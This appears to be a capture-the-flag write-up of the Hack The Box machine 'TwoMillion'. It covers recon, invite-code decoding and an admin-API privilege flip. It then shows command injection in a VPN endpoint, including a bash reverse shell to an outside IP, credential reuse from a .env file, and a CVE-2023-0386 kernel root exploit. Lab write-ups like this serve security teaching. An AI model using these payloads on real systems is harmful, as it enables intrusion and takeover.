# Discovery 
```
# Nmap 7.993 scan initiated Mon Nov 23 18:44:30 2026 as: nmap -sV -p- -T4 --min-rate 1000 -oN nmap.txt 10.129.229.66
Nmap scan report for 10.129.229.66
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 23 18:45:00 2026 -- 1 IP address (1 host up) scanned in 30.17 seconds
```

# Directory Fuzzing
```sh
 ❯ cat gobuster-dir.txt
404                  (Status: 200) [Size: 1674]
api                  (Status: 401) [Size: 0]
home                 (Status: 302) [Size: 0] [--> /]
invite               (Status: 200) [Size: 3859]
logout               (Status: 302) [Size: 0] [--> /]
login                (Status: 200) [Size: 3704]
register             (Status: 200) [Size: 4527]
```
```sh
 ❯ cat gobuster-dir-api.txt
v1                   (Status: 401) [Size: 0]
```
```sh
 ❯ cat gobuster/gobuster-dir-api-v1-user.txt
login                (Status: 302) [Size: 0] [--> /login?error=Please+enter+an+email]
register             (Status: 302) [Size: 0] [--> /register?error=Please+fill+in+all+fields]
auth                 (Status: 405) [Size: 0]
```

# Inspected `inviteapi.min.js`
### Obfuscated
```js
eval(
  (function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36);
    };
    if (!"".replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] || c.toString(a);
      }
      k = [
        function (e) {
          return d[e];
        },
      ];
      e = function () {
        return "\\w+";
      };
      c = 1;
    }
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
      }
    }
    return p;
  })(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    "response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify".split(
      "|",
    ),
    0,
    {},
  ),
);
```
### Deobfuscated
```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };

    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: "/api/v1/invite/verify",

        success: function(response) {
            console.log(response);
        },

        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: "/api/v1/invite/how/to/generate",

        success: function(response) {
            console.log(response);
        },

        error: function(response) {
            console.log(response);
        }
    });
}
```

# Executing `makeInviteCode()` in Browser Console
```
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
​
0: 200
​
data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
​
​
data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
​
​
enctype: "ROT13"
​
​
<prototype>: Object { … }
​
hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
​
success: 1
```

## Decrypting `ROT13` with `CyberChef`-Web
```
....
Amount = 11: Gl mpbcp rm eclcpyrc rfc gltgrc ambc, kyic y NMQR pcoscqr rm /yng/t1/gltgrc/eclcpyrc
Amount = 12: Hm nqcdq sn fdmdqzsd sgd hmuhsd bncd, lzjd z ONRS qdptdrs sn /zoh/u1/hmuhsd/fdmdqzsd
Amount = 13: In order to generate the invite code, make a POST request to /api/v1/invite/generate
Amount = 14: Jo psefs up hfofsbuf uif jowjuf dpef, nblf b QPTU sfrvftu up /bqj/w1/jowjuf/hfofsbuf
Amount = 15: Kp qtfgt vq igpgtcvg vjg kpxkvg eqfg, ocmg c RQUV tgswguv vq /crk/x1/kpxkvg/igpgtcvg
....
```

# Curl `/api/v1/invite/generate`
```sh
 ❯ curl -i -X POST http://2million.htb/api/v1/invite/generate
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 23 Nov 2026 19:48:01 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=2obk6oppdqqkl3g099gl6tvnmo; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"0":200,"success":1,"data":{"code":"UzlSTEYtQkpPT0wtVFFDNFAtMEE2Ulk=","format":"encoded"}}
```

### Decode Invite Code from `Base64` (`CyberChef`)
```
S9RLF-BJOOL-TQC4P-0A6RY
```
With that invite code, i registered a new User

# API Docs exposed
```sh
 ❯ curl -s http://$DOMAIN/api/v1 -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

### Giving User Admin perms
```sh
 ❯ curl -X PUT -s http://$DOMAIN/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
 ❯ curl -X PUT -s http://$DOMAIN/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' -H 'Content-Type: application/json'  | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
~/hackthebox/htb-twomillion   wiseman@wis3man 
 ❯ curl -X PUT -s http://$DOMAIN/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' -H 'Content-Type: application/json' -d 'email=adminboss@gmail.com' | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
~/hackthebox/htb-twomillion   wiseman@wis3man 
 ❯ curl -X PUT -s http://$DOMAIN/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' -H 'Content-Type: application/json' -d '{"email": "adminboss@gmail.com"}' | jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
~/hackthebox/htb-twomillion   wiseman@wis3man 
 ❯ curl -X PUT -s http://$DOMAIN/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' -H 'Content-Type: application/json' -d '{"email": "adminboss@gmail.com", "is_admin": true}' | jq
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
~/hackthebox/htb-twomillion   wiseman@wis3man 
 ❯ curl -X PUT -s http://$DOMAIN/api/v1/admin/settings/update -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' -H 'Content-Type: application/json' -d '{"email": "adminboss@gmail.com", "is_admin": 1}' | jq
{
  "id": 13,
  "username": "adminboss",
  "is_admin": 1
}
```

# Injection Flaw
```
 ❯ curl -X POST http://$DOMAIN/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' -H 'Content-Type: application/json' -d '{"username": "root;id;"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Opening Reverse Shell
```
 ❯ curl -X POST http://$DOMAIN/api/v1/admin/vpn/generate -H 'Cookie: PHPSESSID=e9v7hadl3q9f378c587q7tfgic' -H 'Content-Type: application/json' -d "{\"username\": \"root;bash -c 'bash -i >& /dev/tcp/10.10.15.134/4444 0>&1';\"}"
```

# Found Database User/Pass
```
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

## Found User/Pass in Database
```
MariaDB [htb_prod]> SELECT * FROM users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | adminboss    | adminboss@gmail.com        | $2y$10$IV9H8hmiVbYeP6Ghw7OPDesErii9D2a2fRxr6WsWI8aqYc5Tdn1SS |        1 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
```

# Users on the system
```
www-data@2million:~/html$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

## For `admin`, we already have a password
Successfull Login
```
www-data@2million:~/html$ su admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$
```

# Found user.txt
```
admin@2million:/var/www/html$ cd
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt
0903a21aa315a6533a5a27bffc9f065d
```

# Privilege Escalation
Found interesting Files on the machine
```
admin@2million:~$ find / -perm -4000 2>/dev/null
/snap/snapd/19122/usr/lib/snapd/snap-confine
/snap/core20/1891/usr/bin/chfn
/snap/core20/1891/usr/bin/chsh
/snap/core20/1891/usr/bin/gpasswd
/snap/core20/1891/usr/bin/mount
/snap/core20/1891/usr/bin/newgrp
/snap/core20/1891/usr/bin/passwd
/snap/core20/1891/usr/bin/su
/snap/core20/1891/usr/bin/sudo
/snap/core20/1891/usr/bin/umount
/snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1891/usr/lib/openssh/ssh-keysign
/tmp/CVE-2023-0386/ovlcap/lower/file
/tmp/CVE-2023-0386/ovlcap/upper/file
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```
These two:
```
....
/tmp/CVE-2023-0386/ovlcap/lower/file
/tmp/CVE-2023-0386/ovlcap/upper/file
....
```

After some research, i found out that this CVE is a privelege escalation vuln in the Linux Kernel.

## Exploit
First Terminal
```
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower/ ./gc
[+] len of gc: 0x3ee0
mkdir: File exists
fuse: mountpoint is not empty
fuse: if you are sure this is safe, use the 'nonempty' mount option
fuse_mount: File exists
```
Second Terminal
```
admin@2million:/tmp/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Nov 23 20:55 .
drwxrwxr-x 6 root   root     4096 Nov 23 18:13 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
```

# Found root.txt
```
root@2million:~# cd /root
root@2million:/root# ls
root.txt  snap  thank_you.json
root@2million:/root# cat root.txt
60f9f4cf7f2ba529ba0b09574c65e62a
```

# Funny little `thank_you.json`
```
root@2million:/root# cat thank_you.json
{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
```

# After Decoding that (Multiple-Step Decoding)
```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```
